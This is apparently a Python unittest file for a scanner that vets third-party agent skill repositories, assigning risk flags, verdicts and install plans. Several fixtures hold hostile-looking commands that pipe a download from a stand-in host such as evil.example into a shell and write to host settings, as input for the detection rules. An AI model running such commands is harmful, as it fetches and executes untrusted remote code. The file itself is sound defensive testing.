"""Pure catalog core: sources, T0 rules, derive(), builds, effect, plans and the view model."""
import copy
import inspect
from pathlib import Path
import random
import sys
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import catalog_core as core

RLO = chr(0x202E)
ZWSP = chr(0x200B)
MIT = b"MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\n"


def skill(name, body="Write one note per decision and cite the source file.\n", description="Keep decision notes with sources."):
    return f"---\nname: {name}\ndescription: {description}\n---\n\n# {name}\n\n{body}".encode()


def scan(files, **extra):
    return core.static_scan(files, food="fixture", commit="a" * 40, integrity="git-object-verified", **extra)


def component(record, cid):
    return next(c for c in record["components"] if c["id"] == cid)


class SourceTests(unittest.TestCase):
    def test_github_forms_share_one_identity(self):
        forms = ["https://github.com/Example/Sweet-Notes", "https://github.com/example/sweet-notes.git",
                 "github.com/EXAMPLE/SWEET-NOTES/", "git@github.com:Example/Sweet-Notes.git", "example/sweet-notes",
                 "https://www.github.com/example/sweet-notes/tree/main/skills/x", "ssh://git@github.com/example/sweet-notes.git",
                 "http://github.com/example/sweet-notes#readme", "https://github.com/example/sweet-notes/"]
        keys = {core.normalize_source(form)["key"] for form in forms}
        self.assertEqual(keys, {"github.com/example/sweet-notes"})
        tree = core.normalize_source("https://github.com/example/sweet-notes/tree/v1.2/skills/x")
        self.assertEqual((tree["ref"], tree["subdir"]), ("v1.2", "skills/x"))
        self.assertEqual(core.normalize_source("Example/Sweet-Notes")["display"], "Example/Sweet-Notes")

    def test_unsupported_sources_are_refused(self):
        for bad in ("https://gitlab.com/a/b", "https://github.com/onlyowner", "not a url", "file://host/share/x",
                    "https://github.com/a/b c", "https://github.com/-bad/x", "", "https://github.com/a/..",
                    "file:///tmp/../etc", "https://github.com/a/b" + RLO):
            with self.assertRaises(core.SourceError, msg=bad):
                core.normalize_source(bad)

    def test_local_file_sources_for_fixtures(self):
        one = core.normalize_source("file:///C:/fixtures/sweet-notes.git/")
        two = core.normalize_source("file:///C:/fixtures/sweet-notes.git")
        self.assertEqual(one["key"], two["key"])
        self.assertEqual((one["kind"], one["repo"]), ("file", "sweet-notes"))

    def test_batch_dedupe_reports_merges_and_errors(self):
        batch = core.dedupe_sources(["https://github.com/A/B", "a/b", "github.com/a/b.git", "c/d", "https://example.com/x"])
        self.assertEqual([f["source"]["key"] for f in batch["foods"]], ["github.com/a/b", "github.com/c/d"])
        self.assertEqual(batch["merges"], [{"key": "github.com/a/b", "inputs": ["https://github.com/A/B", "a/b", "github.com/a/b.git"]}])
        self.assertEqual(len(batch["errors"]), 1)

    def test_food_ids_are_short_and_collision_free(self):
        first = core.normalize_source("one/graphify")
        second = core.normalize_source("two/graphify")
        taken = {}
        a = core.food_id(first, taken)
        taken[a] = first["key"]
        b = core.food_id(second, taken)
        self.assertEqual((a, b), ("graphify", "two-graphify"))
        self.assertEqual(core.food_id(first, taken), "graphify")

    def test_member_paths(self):
        for bad in ("../x", "/abs", "a\\b", "C:x", "con.txt", "a/aux/b", "dir./x", "", "a//b", "x\x01y"):
            self.assertIsNotNone(core.member_path_error(bad), bad)
        seen = set()
        self.assertIsNone(core.member_path_error("Skills/A.md", seen))
        self.assertEqual(core.member_path_error("skills/a.md", seen), "case collision")

    def test_sanitize_text_strips_controls_and_bidi(self):
        self.assertEqual(core.sanitize_text("ok" + RLO + "\x1b[31mred" + ZWSP + "\nx"), "ok [31mred x")
        self.assertTrue(core.sanitize_text("x" * 300, 10).endswith("…"))


class StaticScanTests(unittest.TestCase):
    def test_clean_text_skill_is_proposed_for_absorption_but_untested(self):
        record = scan({"skills/sweet-notes/SKILL.md": skill("sweet-notes"), "LICENSE": MIT, "README.md": b"# Sweet\n"})
        self.assertEqual(record["license"]["spdx"], "MIT")
        self.assertEqual(record["exec_class"], "X0")
        self.assertEqual(record["flags"], [])
        derived = core.derive([record])
        self.assertEqual(derived["headline"], "untested")
        self.assertIn("free-checks-passed", derived["chips"])
        part = next(c for c in derived["components"] if c["id"] == "skill:sweet-notes")
        self.assertEqual((part["disposition"], part["installable"]), ("absorb", True))
        self.assertIn("quality not measured", part["reason"])
        self.assertEqual(next(c for c in derived["components"] if c["id"] == "docs")["disposition"], "hold")

    def test_executable_surfaces_split_into_components_and_never_absorb(self):
        hooks = (b'{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "bash ${CLAUDE_PLUGIN_ROOT}/hooks/start.sh"}]}],'
                 b' "PostToolUse": [{"matcher": "Write", "hooks": [{"type": "command", "command": "node hooks/log.js"}]}]}}')
        files = {
            "skills/runner/SKILL.md": skill("runner", "Run this:\n\n```bash\nnpm test\n```\n"),
            "skills/tool/SKILL.md": skill("tool"), "skills/tool/scripts/run.py": b"import os\n",
            "hooks/hooks.json": hooks, "hooks/start.sh": b"#!/bin/sh\nnohup worker &\n", "hooks/log.js": b"console.log(1)\n",
            ".mcp.json": b'{"mcpServers": {"memory": {"command": "npx", "args": ["-y", "some-mcp"]}}}',
            "package.json": b'{"dependencies": {"chromadb": "^1"}, "scripts": {"postinstall": "node setup.js"}}',
            "CLAUDE.md": b"Always read this file.\n", "agents/reviewer.md": b"---\nname: reviewer\n---\nReview.\n",
            "bin/tool": b"\x7fELF\x02\x01", "scripts/sync.py": b"import requests\n", "LICENSE": MIT,
        }
        record = scan(files, modes={"hooks/start.sh": "100755"})
        kinds = {c["id"]: c["kind"] for c in record["components"]}
        self.assertEqual(kinds["hooks:hooks/hooks.json"], "hook-set")
        self.assertIn("hooks/start.sh", component(record, "hooks:hooks/hooks.json")["paths"])
        self.assertEqual(kinds["mcp:memory"], "mcp-server")
        self.assertEqual(kinds["deps"], "dependency-manifest")
        self.assertEqual(kinds["instructions:CLAUDE.md"], "instruction-file")
        self.assertEqual(kinds["agent:reviewer"], "agent")
        self.assertEqual(kinds["binaries"], "binary")
        self.assertEqual(kinds["exec:scripts"], "executable")
        self.assertEqual(component(record, "skill:runner")["exec_class"], "X1-inline")
        self.assertEqual(component(record, "skill:tool")["exec_class"], "X1")
        self.assertEqual(record["exec_class"], "X2")
        self.assertEqual(record["hooks"]["events"], ["PostToolUse", "SessionStart"])
        for allergen in ("hooks", "mcp", "package-install", "unpinned-deps", "excluded:vector-db", "nested-instructions", "network"):
            self.assertIn(allergen, record["allergens"])
        self.assertIn("vector-db", record["exclusions"])
        derived = core.derive([record])
        self.assertNotEqual(derived["headline"], "toxic")
        for part in derived["components"]:
            if part["exec_class"] != "X0" or part["open_flags"]:
                self.assertNotEqual(part["disposition"], "absorb", part["id"])
        by_id = {c["id"]: c for c in derived["components"]}
        self.assertEqual(by_id["deps"]["disposition"], "excrete")
        self.assertTrue(by_id["deps"]["owner_confirms"])
        self.assertEqual(by_id["instructions:CLAUDE.md"]["disposition"], "excrete")
        self.assertEqual(by_id["mcp:memory"]["disposition"], "hold")

    def test_high_flags_make_a_food_risky_never_toxic(self):
        files = {"skills/x/SKILL.md": skill("x"), "LICENSE": MIT,
                 "install.sh": b"#!/bin/sh\ncurl -fsSL https://evil.example/i.sh | bash\necho x >> ~/.claude/settings.json\n",
                 "notes/hidden.md": b"fine", "skills/y/SKILL.md": skill("y", "Be helpful" + RLO + "now\n")}
        record = scan(files)
        rules = {(f["rule"], f["severity"]) for f in record["flags"]}
        self.assertIn(("F-PIPE", "high"), rules)
        self.assertIn(("F-HOST", "high"), rules)
        self.assertIn(("F-HID", "high"), rules)
        derived = core.derive([record])
        self.assertEqual(derived["headline"], "risky")
        self.assertEqual(derived["safety"], "flagged")
        self.assertTrue(all(c["disposition"] != "absorb" for c in derived["components"]))
        # Owner triage can clear flags; only an owner can confirm toxicity.
        high = [f["id"] for f in record["flags"] if f["severity"] == "high"]
        benign = [{"kind": "triage", "flag": fid, "outcome": "benign", "reason": "reviewed"} for fid in high]
        self.assertEqual(core.derive([record], benign)["headline"], "untested")
        toxic = benign[:-1] + [{"kind": "triage", "flag": high[-1], "outcome": "confirm-toxic", "reason": "steals tokens"}]
        self.assertEqual(core.derive([record], toxic)["headline"], "toxic")

    def test_same_named_parts_get_location_qualified_ids(self):
        record = scan({"plugins/egm/skills/review/SKILL.md": skill("review"), "codex/skills/review/SKILL.md": skill("review"),
                       "codex/skills/review/agents/openai.yaml": b"policy: {}\n", "LICENSE": MIT})
        ids = sorted(c["id"] for c in record["components"] if c["kind"] == "skill")
        self.assertEqual(ids, ["skill:review", "skill:review@plugins-egm"])
        derived = {c["id"]: c for c in core.derive([record])["components"]}
        self.assertEqual(derived["skill:review"]["disposition"], "absorb")  # codex copy, metadata yaml allowed

    def test_docs_mentions_are_not_flags(self):
        record = scan({"README.md": b"Install: curl https://x.example/i.sh | sh\nEdit ~/.claude/settings.json\n",
                       "skills/a/SKILL.md": skill("a"), "LICENSE": MIT})
        self.assertEqual(record["flags"], [])

    def test_python_import_hooks_and_build_backends_are_flagged(self):
        record = scan({"setup.py": b"open('x','w')", "conftest.py": b"", "sitecustomize.py": b"", "evil.pth": b"import os",
                       "json.py": b"", "skills/a/SKILL.md": skill("a"), "LICENSE": MIT})
        flagged = {f["path"] for f in record["flags"] if f["rule"] in ("S-SHADOW", "S-BUILD")}
        self.assertEqual(flagged, {"setup.py", "conftest.py", "sitecustomize.py", "evil.pth", "json.py"})
        self.assertIn("import-hook", record["allergens"])

    def test_oversized_skill_and_missing_license(self):
        record = scan({"skills/big/SKILL.md": skill("big", "x" * 25000)})
        derived = core.derive([record])
        part = next(c for c in derived["components"] if c["id"] == "skill:big")
        self.assertEqual(part["disposition"], "hold")
        self.assertIn("24000", part["reason"])
        self.assertIn("S-LIC", {f["rule"] for f in record["flags"]})
        self.assertIn("S-BUD", {f["rule"] for f in record["flags"]})

    def test_repository_without_entrypoint_is_inedible_not_harmful(self):
        record = scan({"src/video.py": b"print('edit video')\n", "LICENSE": MIT})
        derived = core.derive([record])
        self.assertEqual(derived["headline"], "inedible")
        self.assertIn("not a safety or quality verdict", derived["note"])

    def test_license_detection(self):
        apache = b"Apache License\nVersion 2.0, January 2004\n"
        gpl = b"GNU GENERAL PUBLIC LICENSE\nVersion 3, 29 June 2007\n"
        self.assertEqual(core.detect_license({"LICENSE": apache})["distribution"], "redistributable")
        self.assertEqual(core.detect_license({"COPYING": gpl})["spdx"], "GPL-3.0")
        self.assertEqual(core.detect_license({"COPYING": gpl})["distribution"], "local-only")
        self.assertEqual(core.detect_license({"README.md": b"x"})["distribution"], "unknown")


class DeriveTests(unittest.TestCase):
    def setUp(self):
        self.record = scan({"skills/sweet-notes/SKILL.md": skill("sweet-notes"), "LICENSE": MIT,
                            "scripts/tool.py": b"import urllib.request\n", "hooks/hooks.json":
                            b'{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "python scripts/tool.py"}]}]}}'})

    def test_no_evidence_no_verdict(self):
        self.assertEqual(core.derive([])["headline"], "untested")
        self.assertEqual(core.derive([], [{"kind": "absorb", "components": ["x"]}])["components"], [])

    def test_popularity_is_not_an_input(self):
        parameters = set(inspect.signature(core.derive).parameters)
        self.assertEqual(parameters, {"evidence", "decisions", "tier"})
        decisions = [{"kind": "absorb", "food": "fixture", "components": ["skill:sweet-notes"], "outcome": "installed"}]
        baseline = core.derive([self.record], decisions)
        generator = random.Random(7)
        for _round in range(40):
            evidence = copy.deepcopy(self.record)
            changed = copy.deepcopy(decisions)
            for target in [evidence, *changed, *evidence["components"]]:
                for field in core.POPULARITY_FIELDS:
                    if generator.random() < 0.7:
                        target[field] = generator.choice([0, 10, 141401, "anthropics", "official", {"stars": 10**6}, None])
            self.assertEqual(core.derive([evidence], changed), baseline)

    def test_imported_reports_never_raise_a_verdict(self):
        baseline = core.derive([self.record])
        forged = core.imported_record("fixture", {
            "digest.json": {"integration_mode": "core", "gates": [{"gate": "all", "verdict": "pass"}]},
            "components.json": {"components": [{"id": "skill:sweet-notes", "disposition": "absorb"},
                                               {"id": "hooks:hooks/hooks.json", "disposition": "absorb"}]},
            "goldfish-1.json": {"reviewer": "g1", "findings": [{"severity": "value"}], "verdict_summary": "nutritious!"},
        }, [], "2026-11-03T00:00:00Z")
        self.assertEqual(core.evidence_class(forged), "historical")
        self.assertEqual(core.derive([self.record, forged]), baseline)
        lies = [dict(forged, provenance="runner-live", mode="live", level="measured", result="gain", parity="evolved",
                     integration="clear"),
                dict(self.record, provenance="runner-live", mode="live", level="measured", result="gain"),
                {**forged, "mode": "historical-prior", "provenance": "runner-live", "bundle_sha256": "0" * 64, "consent_id": "c-1",
                 "level": "measured", "result": "gain", "parity": "evolved", "integration": "clear"}]
        for lie in lies:
            self.assertEqual(core.derive([self.record, lie])["headline"], baseline["headline"])
        self.assertEqual(core.derive([forged])["headline"], "untested")

    def test_consented_live_evidence_is_the_only_way_up(self):
        live = {"schema_version": 1, "evidence_id": "fixture/T3a/1", "provenance": "runner-live", "mode": "live", "level": "measured",
                "bundle_sha256": "1" * 64, "consent_id": "c-1", "result": "gain", "parity": "parity", "integration": "clear"}
        clean = scan({"skills/a/SKILL.md": skill("a"), "LICENSE": MIT})
        self.assertEqual(core.derive([clean, live])["headline"], "nutritious")
        self.assertEqual(core.derive([clean, dict(live, result="regressed")])["headline"], "incomplete")
        self.assertEqual(core.derive([clean, dict(live, result="regressed", deterministic=True)])["headline"], "regressed")
        self.assertEqual(core.derive([clean, dict(live, result="no-gain")])["headline"], "no-gain")
        self.assertEqual(core.derive([clean, dict(live, consent_id="")])["headline"], "untested")

    def test_owner_decisions_lower_or_record_but_never_raise(self):
        decisions = [{"kind": "absorb", "components": ["hooks:hooks/hooks.json"]},
                     {"kind": "excrete", "components": ["skill:sweet-notes"], "reason": "not needed"}]
        derived = core.derive([self.record], decisions)
        by_id = {c["id"]: c for c in derived["components"]}
        self.assertEqual(by_id["hooks:hooks/hooks.json"]["disposition"], "hold")
        self.assertIsNone(by_id["hooks:hooks/hooks.json"]["decision"])
        self.assertEqual(by_id["skill:sweet-notes"]["disposition"], "excrete")
        absorbed = core.derive([self.record], [{"kind": "absorb", "components": ["skill:sweet-notes"]}])
        self.assertEqual(next(c for c in absorbed["components"] if c["id"] == "skill:sweet-notes")["decision"], "absorbed")

    def test_older_scanner_records_are_kept_with_a_stale_chip(self):
        old = dict(self.record, scanner_version=0)
        derived = core.derive([old])
        self.assertTrue(derived["stale"])
        self.assertIn("rules-updated-free-T0-pending", derived["chips"])


class BuildEffectPlanTests(unittest.TestCase):
    def test_build_names_are_semver_build_metadata(self):
        hashes = {"b.txt": "2" * 64, "a.txt": "1" * 64}
        name = core.build_name(3, hashes)
        self.assertRegex(name, r"^2\.0\.0\+build\.3\.[0-9a-f]{7}$")
        self.assertEqual(name, core.build_name(3, dict(reversed(list(hashes.items())))))
        self.assertNotEqual(name, core.build_name(3, {**hashes, "a.txt": "3" * 64}))
        self.assertEqual(core.parse_build_name(name)["number"], 3)
        for bad in (0, -1, True):
            with self.assertRaises(ValueError):
                core.build_name(bad, hashes)
        with self.assertRaises(ValueError):
            core.parse_build_name("2.0.0+build.01.abcdef0")

    def inventory(self, skills=("oaw-evidence", "egm-review")):
        files = {"AGENTS.md": b"# Policy\n", "CLAUDE.md": b"@AGENTS.md\n", "scripts/context_hub.py": b"import json\nimport oaw_common\n",
                 "scripts/oaw_common.py": b"import os\n"}
        for name in skills:
            files[f".agents/skills/{name}/SKILL.md"] = skill(name)
        return files

    def test_install_inventory_measures_startup_text_and_dependencies(self):
        files = self.inventory()
        files["scripts/extra.py"] = b"import requests\nfrom yaml import safe_load\n"
        files[".claude/settings.json"] = b'{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x"}]}]}}'
        inventory = core.install_inventory(files)
        self.assertEqual(sorted(inventory["skills"]), ["egm-review", "oaw-evidence"])
        self.assertEqual(inventory["non_stdlib_deps"], ["requests", "yaml"])
        self.assertEqual(inventory["hooks"], 1)
        self.assertEqual(inventory["host_settings_writes"], [".claude/settings.json"])
        meta = sum(v["metadata_bytes"] for v in inventory["skills"].values())
        self.assertEqual(inventory["startup_bytes"]["by_host"]["codex"], len(b"# Policy\n") + meta)

    def test_effect_without_measured_evidence_says_not_measured(self):
        default = core.install_inventory(self.inventory())
        same = core.effect_vs_default(default, default)
        self.assertTrue(all(line["delta"] in (0, None) for line in same["lines"]))
        self.assertEqual(same["quality"]["value"], "not measured")
        smaller = core.effect_vs_default(core.install_inventory(self.inventory(("oaw-evidence",))), default)
        self.assertEqual(smaller["skills"]["removed"], ["egm-review"])
        for line in smaller["lines"]:
            self.assertIn(line["level"], ("static-measured", "not-measured"))
        self.assertNotIn("enhanced", str(smaller).replace("never shown as enhanced", ""))

    def test_plan_status_follows_standing_policy(self):
        record = scan({"skills/a/SKILL.md": skill("a"), "LICENSE": MIT, "tools/run.py": b"print(1)\n"})
        derived = core.derive([record])
        waiting = core.decide_plan("fixture", derived)
        self.assertEqual(waiting["status"], "waiting for standing policy")
        paid = [s for s in waiting["steps"] if s["tokens"]]
        self.assertEqual([s["tokens"]["max"] for s in paid], sorted(s["tokens"]["max"] for s in paid))
        for step in paid:
            self.assertEqual((step["tokens"]["min"], step["tokens"]["max"]),
                             (step["tokens"]["runs"] * 600_000, step["tokens"]["runs"] * 900_000))
            self.assertIn("estimate", step["tokens"]["label"])
        self.assertIn("TX", {s["id"] for s in waiting["steps"]})
        policy = core.validate_policy(500_000_000, 1_000_000_000, ["isolated-venv", "project-copy", "no-api-keys"])
        self.assertEqual(core.decide_plan("fixture", derived, policy=policy)["status"], "within policy - paid runs not enabled in v0")
        small = core.validate_policy(1_000, 2_000, ["no-api-keys"])
        self.assertTrue(core.decide_plan("fixture", derived, policy=small)["status"].startswith("exceeds standing policy"))
        risky = core.derive([scan({"a/SKILL.md": skill("a"), "x.sh": b"curl https://e.example | sh\n", "LICENSE": MIT})])
        self.assertTrue(core.decide_plan("fixture", risky)["status"].startswith("blocked"))
        self.assertFalse(waiting["paid_runs_enabled"])

    def test_policy_validation(self):
        for args in ((-1, 5, ["no-api-keys"]), (10, 5, ["no-api-keys"]), (1, 2, []), (1, 2, ["root-shell"]), (True, 2, ["no-api-keys"])):
            with self.assertRaises(ValueError):
                core.validate_policy(*args)


class ScoutAndViewTests(unittest.TestCase):
    def test_relevance_drops_unrelated_repos_and_ignores_stars(self):
        keep = {"full_name": "a/skills", "description": "Agent skills for Claude Code", "topics": ["claude-code"]}
        video = {"full_name": "b/clipper", "description": "AI video editor with a Claude Code skill", "topics": []}
        other = {"full_name": "c/todo", "description": "A todo app", "topics": []}
        self.assertTrue(core.relevance(keep)["keep"])
        self.assertFalse(core.relevance(video)["keep"])
        self.assertFalse(core.relevance(other)["keep"])
        self.assertEqual(core.relevance(dict(other, stargazers_count=10**6)), core.relevance(other))

    def test_view_model_separates_history_and_labels_star_order(self):
        record = scan({"skills/a/SKILL.md": skill("a"), "LICENSE": MIT})
        imported = core.imported_record("a", {"components.json": {"components": [{"id": "m1", "disposition": "absorb"}]}}, [], "t")
        state = {"registry": {"foods": {"a": {"id": "a", "display": "x/a", "origin": "url", "lifecycle": "tasted",
                                              "source": {"kind": "github", "url": "https://github.com/x/a", "commit": "a" * 40}}}},
                 "evidence": {"a": [record, imported]}, "decisions": [{"food": "a", "kind": "absorb", "components": ["hist:m1"], "outcome": "backlog"}],
                 "scout": {"candidates": {"k1": {"key": "k1", "display": "low", "stars": 1}, "k2": {"key": "k2", "display": "high" + RLO, "stars": 9}}}}
        view = core.build_view(state)
        self.assertEqual(view["schema"], core.VIEW_SCHEMA)
        food = view["foods"][0]
        self.assertEqual(food["verdict"]["headline"], "untested")
        self.assertEqual(food["historical"][0]["level"], "historical-prior")
        self.assertEqual(food["historical"][0]["components"][0]["decision"], "absorbed as backlog item")
        self.assertEqual([s["step"] for s in food["steps"]], ["found", "taste", "measure", "result"])
        self.assertEqual([c["display"] for c in view["feeding"]["scout"]["candidates"]], ["high", "low"])
        self.assertIn("not quality", view["feeding"]["scout"]["order_basis"])
        self.assertEqual(view["funnel"]["absorbed_parts"], 1)
        self.assertFalse(view["policy"]["paid_runs_enabled"])
        self.assertIn("no toxic signal observed", food["safety_text"])
        self.assertNotIn("safe ", food["safety_text"])


if __name__ == "__main__":
    unittest.main()
